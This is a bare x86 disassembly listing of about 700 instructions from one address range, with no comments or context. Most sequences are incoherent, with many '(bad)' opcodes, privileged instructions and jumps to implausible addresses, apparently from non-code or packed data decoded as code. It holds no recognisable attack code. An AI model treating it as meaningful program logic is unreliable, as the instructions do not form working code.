  429c5b:	xor    DWORD PTR [ebx],0x660033fc
  429c61:	mov    DWORD PTR [ebp-0xc],ecx
  429c64:	pcmpgtw mm0,mm0
  429c67:	add    dl,ah
  429c69:	leave  
  429c6a:	mov    edi,DWORD PTR [esi-0x7d]
  429c6d:	push   ax
  429c6f:	dec    ebp
  429c70:	mov    esi,DWORD PTR [ebx-0x75]
  429c73:	lea    ebp,[eax-0x7c00fffc]
  429c79:	xor    eax,DWORD PTR [eax]
  429c7b:	sysret 
  429c7d:	dec    ebp
  429c7e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c85:	push   WORD PTR [ecx+0x8]
  429c89:	jne    0x429c4c
  429c8b:	ud0    ecx,DWORD PTR [ecx]
  429c8e:	mov    esi,DWORD PTR [edx]
  429c90:	lods   al,BYTE PTR ds:[esi]
  429c91:	add    BYTE PTR [eax],al
  429c93:	data16 (bad) 
  429c95:	iret   
  429c96:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c9d:	cli    
  429c9e:	inc    ebp
  429c9f:	cmp    al,0x8d
  429ca1:	add    BYTE PTR [esi+0x2d],ah
  429ca4:	inc    ebp
  429ca5:	pop    ebp
  429ca6:	lea    ecx,[edi]
  429ca8:	mov    dl,bh
  429caa:	add    BYTE PTR [edi],cl
  429cac:	mov    DWORD PTR [eax+eax*8],edi
  429caf:	mov    ebx,0x3a87
  429cb4:	add    BYTE PTR [ebx],ch
  429cb6:	inc    ebp
  429cb7:	data16 (bad) 
  429cb9:	clc    
  429cba:	int3   
  429cbb:	cmp    eax,DWORD PTR [eax]
  429cbd:	je     0x429c48
  429cbf:	push   0xffffffc8
  429cc1:	pop    edi
  429cc2:	xchg   DWORD PTR [ebp+0x0],eax
  429cc5:	data16 add BYTE PTR [ebp+0x45],cl
  429cc9:	lea    cx,[ebp+0x10]
  429ccd:	jb     0x429ccf
  429ccf:	jmp    0x429c5a
  429cd1:	call   eax
  429cd3:	clc    
  429cd4:	xchg   DWORD PTR [edi+0x1],edi
  429cd7:	mov    eax,DWORD PTR [eax]
  429cd9:	or     BYTE PTR [ebp-0x49],al
  429cdc:	lea    eax,[eax+0x74003154]
  429ce2:	push   edi
  429ce3:	inc    edx
  429ce4:	jge    0x429ce5
  429ce6:	mov    DWORD PTR [edi],ecx
  429ce8:	fdiv   DWORD PTR [edi-0x6]
  429ceb:	inc    DWORD PTR [eax]
  429ced:	xor    edx,DWORD PTR [eax+0x5f]
  429cf0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cf3:	ret    0x0
  429cf6:	xor    BYTE PTR [ebp-0x51],cl
  429cf9:	cmp    edi,0xf0ff8904
  429cff:	data16 ror al,0x84
  429d03:	rol    BYTE PTR [eax],0x3b
  429d06:	add    al,dh
  429d08:	dec    eax
  429d09:	xchg   esp,eax
  429d0a:	push   ebx
  429d0b:	jmp    0x429c98
  429d0d:	push   ebp
  429d0e:	add    esp,ebp
  429d10:	add    ebp,esp
  429d12:	mov    edx,DWORD PTR [edi+0x24]
  429d15:	clc    
  429d16:	dec    esi
  429d17:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429d1d:	cmp    BYTE PTR [ebx],al
  429d1f:	jne    0x429caa
  429d21:	xor    esp,eax
  429d23:	jmp    0x459ea6
  429d28:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d2b:	jne    0x429d21
  429d2d:	call   0xffcc9a87
  429d32:	clc    
  429d33:	xchg   edi,eax
  429d34:	sti    
  429d35:	add    DWORD PTR [ebx],eax
  429d37:	add    BYTE PTR [ebp+0x47],bl
  429d3a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d40:	pop    ebp
  429d41:	mov    DWORD PTR [esi-0x48],esi
  429d44:	jmp    0x429d8d
  429d46:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d4c:	(bad)  
  429d4e:	cmp    al,0x0
  429d50:	cmp    eax,DWORD PTR [ebp+0x18]
  429d53:	lea    ebx,[ebp-0x56]
  429d56:	jle    0x429d58
  429d58:	jae    0x429ce3
  429d5a:	mov    eax,esp
  429d5c:	call   0xb900:0x8b005587
  429d63:	inc    ebp
  429d64:	push   ebp
  429d65:	lea    ecx,[ebp-0x27ff4f12]
  429d6b:	mov    eax,edi
  429d6d:	int3   
  429d6e:	push   ebp
  429d6f:	xchg   edi,eax
  429d71:	add    esp,ebp
  429d73:	add    BYTE PTR [eax],al
  429d75:	inc    ebp
  429d76:	add    BYTE PTR [ebp+0x8b3255],cl
  429d7c:	cld    
  429d7d:	mov    DWORD PTR [edx],edi
  429d7f:	aam    0x75
  429d81:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d87:	mov    DWORD PTR [ebx-0x50],edx
  429d8a:	test   BYTE PTR [ebp-0x1],0xe8
  429d8e:	mov    eax,DWORD PTR [eax]
  429d90:	hlt    
  429d91:	add    al,al
  429d93:	mov    eax,DWORD PTR ds:0x890045a8
  429d99:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d9f:	inc    DWORD PTR [eax*2+0xf75854d]
  429da6:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429dac:	call   0x7298faed
  429db1:	je     0x429e11
  429db3:	js     0x429e14
  429db5:	lock ret 0x7e
  429db9:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429dbf:	mov    edi,edi
  429dc1:	sbb    al,bl
  429dc3:	clc    
  429dc4:	add    BYTE PTR [ebp-0x73],bh
  429dc7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dcd:	ror    BYTE PTR [eax],1
  429dcf:	dec    ebp
  429dd0:	xchg   ebp,eax
  429dd1:	mov    edi,edi
  429dd3:	in     al,0x8b
  429dd5:	jge    0x429d60
  429dd7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429ddd:	clc    
  429dde:	pop    esi
  429ddf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429de5:	clc    
  429de6:	add    al,0x6e
  429de8:	mov    eax,DWORD PTR [ebx]
  429dea:	mov    BYTE PTR [ebp+0x0],dl
  429ded:	mov    edx,DWORD PTR [ebx-0x20]
  429df0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429df6:	add    eax,0x3b3a73
  429dfb:	adc    al,0x89
  429dfd:	pop    eax
  429dfe:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429e02:	ret    0xf08
  429e05:	cmp    al,0x2
  429e07:	mov    DWORD PTR [edx],esi
  429e09:	cld    
  429e0a:	add    BYTE PTR [ebp+0x66],dl
  429e0d:	add    eax,ebx
  429e0f:	add    esp,eax
  429e11:	sub    eax,eax
  429e13:	or     BYTE PTR [ecx-0x77f474bb],cl
  429e19:	add    BYTE PTR [eax],al
  429e1b:	mov    DWORD PTR [ebx-0x24],ebx
  429e1e:	push   edi
  429e1f:	push   ebp
  429e20:	clc    
  429e21:	add    DWORD PTR [esi+0x1b0100],0x45
  429e28:	out    0xff,eax
  429e2a:	add    edx,DWORD PTR [eax]
  429e2c:	jmp    0x429e16
  429e2e:	cmp    ch,0x43
  429e31:	(bad)  
  429e32:	jmp    0x40c82684
  429e37:	je     0x429dc3
  429e39:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e3f:	inc    ebp
  429e40:	add    BYTE PTR [ebx-0x770375],al
  429e46:	add    ah,ch
  429e48:	add    edx,esp
  429e4a:	pop    edi
  429e4b:	pop    ebp
  429e4c:	push   ebp
  429e4d:	inc    ebx
  429e4e:	in     al,dx
  429e4f:	pop    ebp
  429e50:	in     al,dx
  429e51:	cmp    edx,DWORD PTR [edi-0x8]
  429e54:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e5b:	add    al,0x47
  429e5d:	push   ebp
  429e5e:	mov    esp,ebp
  429e60:	in     al,0x45
  429e62:	dec    ebp
  429e63:	push   esi
  429e64:	test   DWORD PTR [eax+0xff010f],esi
  429e6a:	add    BYTE PTR [eax+0xc018b],dh
  429e70:	leave  
  429e71:	inc    ebp
  429e72:	test   al,ch
  429e74:	add    dh,bh
  429e76:	add    bh,bh
  429e78:	dec    ebp
  429e79:	push   cs
  429e7a:	mov    DWORD PTR [ecx],eax
  429e7c:	hlt    
  429e7d:	push   es
  429e7e:	dec    ebp
  429e7f:	leave  
  429e80:	mov    DWORD PTR [eax],ecx
  429e82:	clc    
  429e83:	cmovge eax,ecx
  429e86:	mov    ecx,0x85c2f0
  429e8c:	clc    
  429e8d:	pop    DWORD PTR [ebp+0x1]
  429e90:	aas    
  429e91:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e98:	push   esi
  429e99:	add    BYTE PTR [ebp-0x4],al
  429e9c:	mov    DWORD PTR [eax],eax
  429e9e:	cld    
  429e9f:	inc    bp
  429ea1:	add    DWORD PTR [edx],edi
  429ea3:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429eab:	mov    ebx,0xcd4f68
  429eb0:	mov    edi,DWORD PTR [ebx]
  429eb2:	or     al,0x75
  429eb4:	(bad)  
  429eb5:	xor    ecx,ebx
  429eb7:	enterw 0x4d01,0x87
  429ebc:	jmp    0x429ec2
  429ec1:	ret    
  429ec2:	inc    ebp
  429ec3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ec9:	add    dh,cl
  429ecb:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429ed3:	icebp  
  429ed4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eda:	inc    ebp
  429edb:	inc    edx
  429edc:	mov    ecx,DWORD PTR [edx]
  429ede:	or     al,0xf9
  429ee0:	(bad)  
  429ee1:	jne    0x429eb1
  429ee3:	mov    cl,0x0
  429ee6:	rol    BYTE PTR [esi+0x450134],1
  429eec:	add    eax,edi
  429eee:	cld    
  429eef:	ret    
  429ef0:	dec    ebp
  429ef1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ef7:	mov    edi,0xf82c8534
  429efc:	jmp    0x429f7b
  429efe:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429f04:	mov    dl,0x8b
  429f06:	sub    cl,BYTE PTR [eax]
  429f08:	mov    ecx,ecx
  429f0a:	in     al,dx
  429f0b:	test   cl,dh
  429f0d:	add    BYTE PTR [edx],al
  429f0f:	add    BYTE PTR [eax-0x377a97b3],al
  429f15:	cmovge esi,esp
  429f18:	add    eax,DWORD PTR [eax]
  429f1a:	cld    
  429f1b:	mov    eax,DWORD PTR [ecx]
  429f1d:	adc    BYTE PTR [ebp+0x4d],cl
  429f20:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f26:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f2c:	cmp    esp,ebx
  429f2e:	jne    0x429ecc
  429f30:	mov    eax,edi
  429f32:	adc    ah,ch
  429f34:	push   ebp
  429f35:	test   DWORD PTR [ebx],esi
  429f37:	clc    
  429f38:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f3e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f41:	dec    ebp
  429f42:	adc    bh,al
  429f44:	push   0x8b85ff10
  429f49:	clc    
  429f4a:	or     al,0x50
  429f4c:	(bad)  
  429f4d:	push   ecx
  429f4e:	retf   
  429f4f:	mov    ebx,0xff4d8dc8
  429f54:	mov    DWORD PTR [ebp+0x8],eax
  429f57:	xor    eax,DWORD PTR [ebp-0x75]
  429f5a:	cmp    ebp,DWORD PTR [ebx]
  429f5c:	lsl    ebx,WORD PTR [edi-0x8]
  429f60:	call   DWORD PTR [ebx-0x741bff75]
  429f66:	(bad)  
  429f67:	or     al,0x5b
  429f69:	dec    ebp
  429f6a:	or     BYTE PTR [ebx],dh
  429f6c:	inc    ebp
  429f6d:	xor    esi,DWORD PTR ds:0x708088d
  429f73:	in     eax,0x98
  429f75:	add    BYTE PTR [edx],dh
  429f77:	inc    ebp
  429f78:	pop    edi
  429f79:	xor    eax,edx
  429f7b:	test   DWORD PTR [eax],0x81108b8b
  429f81:	dec    ebp
  429f82:	sub    al,0x33
  429f84:	add    BYTE PTR [ebx],dh
  429f86:	push   esi
  429f87:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f8d:	mov    edi,eax
  429f8f:	or     BYTE PTR [ebp+0x45],al
  429f92:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f98:	cmp    cl,cl
  429f9a:	pushf  
  429f9b:	push   es
  429f9c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429fa3:	dec    ebp
  429fa4:	inc    ebp
  429fa5:	and    BYTE PTR [eax],0x50
  429fa8:	pushf  
  429fa9:	push   0x4de4d1c7
  429fae:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429fb4:	fsubr  st,st(1)
  429fb6:	xlat   BYTE PTR ds:[ebx]
  429fb7:	rol    bh,cl
  429fb9:	mov    edx,esp
  429fbb:	or     BYTE PTR [ebp+0x4588f84d],al
  429fc1:	mov    ecx,DWORD PTR [eax]
  429fc3:	or     BYTE PTR [eax],al
  429fc5:	push   ebp
  429fc6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fcc:	dec    ebp
  429fcd:	enter  0xceba,0x8
  429fd1:	retf   0x1807
  429fd4:	ret    0x984d
  429fd7:	mov    esi,DWORD PTR [edx]
  429fd9:	or     al,0x33
  429fdb:	into   
  429fdc:	add    edx,esi
  429fde:	add    ecx,edx
  429fe0:	bswap  eax
  429fe2:	ror    esi,0x98
  429fe5:	dec    ebp
  429fe6:	add    cl,ch
  429fe8:	mov    edi,edi
  429fea:	hlt    
  429feb:	inc    esi
  429fed:	inc    ebp
  429fee:	ret    0x4533
  429ff1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429ff7:	or     BYTE PTR [ebx],dh
  429ff9:	dec    ebp
  429ffa:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  42a000:	jne    0xff8c9fc7
  42a006:	inc    ebp
  42a007:	inc    ebp
  42a008:	mov    esi,DWORD PTR [ebx]
  42a00a:	clc    
  42a00b:	pop    esi
  42a00c:	ret    0xcaeb
  42a00f:	mov    eax,esi
  42a011:	call   0x5203f0e4
  42a016:	dec    ebp
  42a017:	add    eax,0xf8728b
  42a01c:	adc    eax,0xce0ccac9
  42a021:	push   ebp
  42a022:	ret    0xc6ec
  42a025:	in     al,dx
  42a026:	call   0x3342ed2f
  42a02b:	push   edi
  42a02c:	add    edi,eax
  42a02e:	xor    eax,eax
  42a030:	jmp    0x42a077
  42a032:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a038:	add    eax,edi
  42a03a:	shr    eax,cl
  42a03c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a042:	mov    edi,DWORD PTR [ecx]
  42a044:	in     al,dx
  42a045:	pushf  
  42a046:	ret    0x84c7
  42a049:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a04f:	inc    ebp
  42a050:	in     al,dx
  42a051:	cmp    BYTE PTR [ebp-0x64],al
  42a054:	mov    eax,edi
  42a056:	cld    
  42a057:	fmul   st(2),st
  42a059:	sbb    dl,al
  42a05b:	jmp    0x9c3b:0x374d45c1
  42a062:	jbe    0x42a02b
  42a064:	mov    esp,eax
  42a066:	clc    
  42a067:	add    BYTE PTR [ebp+0x0],cl
  42a06a:	mov    ecx,ecx
  42a06c:	lea    eax,[ebp-0x5]
  42a06f:	mov    edi,edi
  42a071:	call   0x51cdf0bb
  42a076:	hlt    
  42a077:	xor    eax,edx
  42a079:	mov    esi,0x987284
  42a07e:	xor    cl,dl
  42a080:	mov    esi,eax
  42a082:	hlt    
  42a083:	into   
  42a084:	inc    ebp
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	mov    ebp,ecx
  42a088:	cld    
  42a089:	add    dl,cl
  42a08b:	add    dl,al
  42a08d:	inc    ebp
  42a08e:	shr    DWORD PTR [ebx],0x4d
  42a091:	xor    edi,DWORD PTR [ebx]
  42a093:	mov    DWORD PTR [edi],ecx
  42a095:	clc    
  42a096:	dec    esi
  42a097:	inc    ebp
  42a098:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a09e:	ret    0xc6ca
  42a0a1:	mov    BYTE PTR [ebp-0x32],0x53
  42a0a5:	scas   eax,DWORD PTR es:[edi]
  42a0a6:	inc    ebp
  42a0a7:	jmp    0x42a0e0
  42a0a9:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a0b0:	pop    ebx
  42a0b1:	xor    ecx,DWORD PTR [ebp+0x3]
  42a0b4:	mov    eax,DWORD PTR [ebx]
  42a0b6:	clc    
  42a0b7:	test   edx,ecx
  42a0b9:	mov    ecx,esi
  42a0bb:	cld    
  42a0bc:	call   0x8ab6e606
  42a0c1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0c7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0cd:	fdiv   QWORD PTR [ebx]
  42a0cf:	retf   0xce89
  42a0d2:	in     al,0xc1
  42a0d4:	inc    ebp
  42a0d5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0db:	into   
  42a0dc:	mov    dh,0xc1
  42a0df:	call   0x8c16e668
  42a0e4:	(bad)  
  42a0e5:	cld    
  42a0e6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0e9:	xor    eax,ecx
  42a0eb:	lea    eax,[ebp+0x8]
  42a0ee:	mov    esi,DWORD PTR [edx-0x4]
  42a0f1:	add    dl,al
  42a0f3:	inc    ebp
  42a0f4:	mov    esp,0x32d8988b
  42a0f9:	dec    ebp
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	cld    
  42a0fd:	xor    eax,edx
  42a0ff:	sub    ebp,DWORD PTR [eax-0x75]
  42a102:	int    0xec
  42a104:	sub    ecx,eax
  42a106:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a10c:	mov    esi,esp
  42a10e:	call   0x3416ee97
  42a113:	inc    DWORD PTR [ebx]
  42a115:	mov    edi,DWORD PTR [ebx]
  42a117:	cld    
  42a118:	jne    0x42a167
  42a11a:	mov    esi,DWORD PTR [ebx]
  42a11c:	aam    0x8d
  42a11e:	dec    ebp
  42a11f:	or     BYTE PTR [ebx],dh
  42a121:	jb     0x42a126
  42a123:	add    BYTE PTR [edi+0x45],bl
  42a126:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a12d:	xor    ebp,esp
  42a12f:	xor    eax,edi
  42a131:	sub    edi,esp
  42a133:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a139:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a140:	inc    ebp
  42a141:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a147:	clc    
  42a148:	mov    eax,edi
  42a14a:	nop
  42a14b:	fadd   QWORD PTR [eax]
  42a14d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a153:	jmp    0x42a0de
  42a155:	mov    eax,DWORD PTR [ecx]
  42a157:	fadd   DWORD PTR [eax]
  42a159:	inc    ebp
  42a15a:	or     DWORD PTR [ebx],esi
  42a15c:	dec    eax
  42a15d:	add    edx,DWORD PTR [ebx-0x2d]
  42a160:	dec    ebp
  42a161:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a167:	inc    ebp
  42a168:	push   eax
  42a169:	mov    dl,BYTE PTR [ecx-0xd]
  42a16c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a16f:	(bad)  
  42a171:	rol    BYTE PTR [eax],0xc1
  42a174:	ret    
  42a175:	inc    ebp
  42a176:	inc    ebp
  42a177:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a17d:	xor    eax,ebx
  42a17f:	add    eax,DWORD PTR [ebp+0x23]
  42a182:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a188:	cmp    edi,0xc
  42a18b:	dec    ebp
  42a18c:	inc    ebp
  42a18d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a193:	inc    ebp
  42a194:	mov    esi,DWORD PTR [ebx]
  42a196:	clc    
  42a197:	lea    eax,[ebp+0x45725407]
  42a19d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a1a1:	xor    edi,DWORD PTR [eax]
  42a1a3:	mov    ecx,0xff8b8d4d
  42a1a8:	push   esp
  42a1a9:	enter  0x4df7,0x23
  42a1ad:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a1b3:	mov    eax,DWORD PTR [ebx]
  42a1b5:	loopne 0x42a1a2
  42a1b7:	ret    0xc68b
  42a1ba:	push   esp
  42a1bb:	enter  0x9745,0x8b
  42a1bf:	inc    ebp
  42a1c0:	cld    
  42a1c1:	mov    eax,edi
  42a1c3:	clc    
  42a1c4:	ret    
  42a1c5:	ret    0xc645
  42a1c8:	mov    esi,DWORD PTR [ebx]
  42a1ca:	cld    
  42a1cb:	pop    esi
  42a1cc:	mov    ebx,0x83458bc3
  42a1d2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1d6:	dec    ebp
  42a1d7:	cmp    BYTE PTR [ebx],dh
  42a1d9:	pushf  
  42a1da:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1e0:	fcom   DWORD PTR [ebp+0x45]
  42a1e3:	mov    edi,DWORD PTR [edx]
  42a1e5:	adc    al,0x9c
  42a1e7:	inc    ebp
  42a1e8:	(bad)  
  42a1e9:	mov    ebx,eax
  42a1eb:	adc    al,0x85
  42a1ed:	cmp    al,0x1
  42a1f0:	inc    ebp
  42a1f1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1f8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1fe:	xor    eax,DWORD PTR [ebx]
  42a200:	add    edi,DWORD PTR [ecx+ecx*4]
  42a203:	mov    esp,esi
  42a205:	clc    
  42a206:	inc    ebp
  42a207:	inc    ebp
  42a208:	add    edx,DWORD PTR [esi+0xc]
  42a20b:	mov    edi,0x7ff0845
  42a210:	in     al,dx
  42a211:	(bad)  
  42a212:	jne    0x42a1ac
  42a214:	mov    esi,DWORD PTR [edx]
  42a216:	clc    
  42a217:	add    ebp,DWORD PTR [edx]
  42a219:	mov    edi,edi
  42a21b:	in     al,dx
  42a21c:	mov    DWORD PTR [ebp-0x10],eax
  42a21f:	xor    eax,DWORD PTR [ebp+0x3]
  42a222:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a228:	fmul   DWORD PTR [ebx-0x173caf39]
  42a22e:	lea    ecx,[ecx+0x45e8d4bc]
  42a234:	clc    
  42a235:	mov    edi,edi
  42a237:	cmp    BYTE PTR [ebp+0x4d],al
  42a23a:	test   DWORD PTR [eax+0x74],ecx
  42a23d:	inc    ecx
  42a23e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a244:	ret    
  42a245:	inc    eax
  42a246:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a24c:	push   eax
  42a24d:	dec    eax
  42a24e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a24f:	sar    bh,1
  42a251:	enter  0x458b,0xec
  42a255:	mov    eax,DWORD PTR [ebp+0x38]
  42a258:	mov    eax,ecx
  42a25a:	fadd   DWORD PTR [ebx]
  42a25c:	dec    ebp
  42a25d:	inc    eax
  42a25e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a264:	inc    ebp
  42a265:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a26b:	fadd   QWORD PTR [ebx]
  42a26d:	inc    ebp
  42a26e:	or     al,0x33
  42a270:	dec    ebp
  42a271:	add    edi,DWORD PTR [ebx]
  42a273:	mov    DWORD PTR [edx-0x28],esi
  42a276:	mov    eax,DWORD PTR [ebp-0x10]
  42a279:	mov    eax,DWORD PTR [eax+0x10]
  42a27c:	mov    eax,edi
  42a27e:	lock ret 
  42a280:	inc    ecx
  42a281:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a287:	fsubr  st,st(5)
  42a289:	test   DWORD PTR [eax],eax
  42a28b:	clc    
  42a28c:	push   0x45
  42a28e:	(bad)  
  42a28f:	cmp    ebp,esp
  42a291:	pushf  
  42a292:	inc    ebp
  42a293:	(bad)  
  42a294:	push   eax
  42a295:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a299:	clc    
  42a29a:	mov    eax,0xf8008584
  42a29f:	mov    eax,DWORD PTR [ebp-0x4]
  42a2a2:	mov    edi,0x4585c3cc
  42a2a8:	clc    
  42a2a9:	mov    eax,DWORD PTR [ebp+0x14]
  42a2ac:	cmp    al,BYTE PTR [ebp-0x64]
  42a2af:	mov    edi,eax
  42a2b1:	in     al,dx
  42a2b2:	les    esi,FWORD PTR [ebp-0x7b]
  42a2b5:	mov    edi,eax
  42a2b7:	or     al,0x4d
  42a2b9:	dec    ebp
  42a2ba:	mov    eax,ebp
  42a2bc:	in     al,0xf2
  42a2be:	dec    ebp
  42a2bf:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2c5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2cb:	inc    ebp
  42a2cc:	mov    DWORD PTR [ebx],esi
  42a2ce:	fadd   QWORD PTR [ebx]
  42a2d0:	dec    ebp
  42a2d1:	push   eax
  42a2d2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2d5:	push   eax
  42a2d6:	mov    DWORD PTR [eax],ebx
  42a2d8:	fdivr  st,st(7)
  42a2da:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2e1:	dec    esi
  42a2e2:	clc    
  42a2e3:	inc    ebp
  42a2e4:	test   BYTE PTR [ebx],dh
  42a2e6:	add    DWORD PTR [ebx],eax
  42a2e8:	add    BYTE PTR [eax+0x4d],dl
  42a2eb:	jne    0x42a320
  42a2ed:	lea    ecx,[ebx-0x7617fc44]
  42a2f3:	div    ah
  42a2f5:	inc    DWORD PTR [ebp+0x45]
  42a2f8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2fe:	jb     0x42a28b
  42a300:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a307:	mov    ecx,DWORD PTR [ebp-0x10]
  42a30a:	xor    ecx,DWORD PTR [ebp+0x3]
  42a30d:	mov    edi,DWORD PTR [ebx]
  42a30f:	adc    BYTE PTR [ebp+0x41],dh
  42a312:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a318:	ret    
  42a319:	push   ss
  42a31a:	push   0x45
  42a31c:	lea    ecx,[ebx+0x4de80cb0]
  42a322:	sti    
  42a323:	add    edi,edi
  42a325:	or     BYTE PTR [ebp+0x4d],al
  42a328:	mov    ebp,DWORD PTR [ebx]
  42a32a:	xor    ebp,ecx
  42a32c:	mov    al,BYTE PTR [edx]
  42a32e:	add    eax,0xc7200
  42a333:	jne    0x42a382
  42a335:	lea    esi,[ebx]
  42a337:	mov    al,0xf
  42a339:	call   0xe99fe
  42a33e:	sar    DWORD PTR [eax],0x84
  42a341:	pushf  
  42a342:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a348:	mov    edi,DWORD PTR [ecx]
  42a34a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a351:	test   DWORD PTR [eax],eax
  42a353:	clc    
  42a354:	dec    ebp
  42a355:	inc    ebp
  42a356:	xor    edi,DWORD PTR [ebx]
  42a358:	setl   al
  42a35b:	(bad)  
  42a35c:	retf   
  42a35d:	rol    cl,1
  42a35f:	dec    ebp
  42a360:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a366:	inc    ebp
  42a367:	lea    ecx,[ebx-0x75b2cc38]
  42a36d:	lea    eax,ds:0x4d72c4
  42a373:	mov    ecx,DWORD PTR [ebp-0x4]
  42a376:	xor    ecx,edi
  42a378:	bswap  ebx
  42a37a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a37e:	rol    DWORD PTR [ecx],0x84
  42a381:	add    BYTE PTR [ecx],al
  42a383:	cmp    al,BYTE PTR [eax]
  42a385:	pushf  
  42a386:	inc    ebp
  42a387:	jnp    0x8a42d78a
  42a38d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a393:	lock dec ebp
  42a395:	retf   
  42a396:	xor    ecx,DWORD PTR [ebp+0xf]
  42a399:	mov    eax,eax
  42a39b:	fmul   st,st(3)
  42a39d:	test   ecx,0x1988484
  42a3a3:	xor    al,BYTE PTR [eax]
  42a3a5:	mov    DWORD PTR [ebp-0x28],eax
  42a3a8:	mov    eax,DWORD PTR [ebp+0x33]
  42a3ab:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a3b1:	ret    
  42a3b2:	add    al,cl
  42a3b4:	dec    ebp
  42a3b5:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a3bb:	add    ecx,DWORD PTR ds:0xc7250
  42a3c1:	inc    ebp
  42a3c2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3c6:	mov    edi,edi
  42a3c8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ce:	jb     0x42a397
  42a3d0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3d7:	mov    esi,DWORD PTR [ebx]
  42a3d9:	cld    
  42a3da:	mov    cl,bh
  42a3dc:	or     eax,0x372b6
  42a3e1:	cmp    ecx,eax
  42a3e3:	jne    0x42a460
  42a3e9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3ec:	mov    eax,DWORD PTR [eax]
  42a3ee:	xor    eax,edi
  42a3f0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi-0x3f],dl
  42a407:	add    BYTE PTR [ebp-0x75],cl
  42a40a:	mov    esi,eax
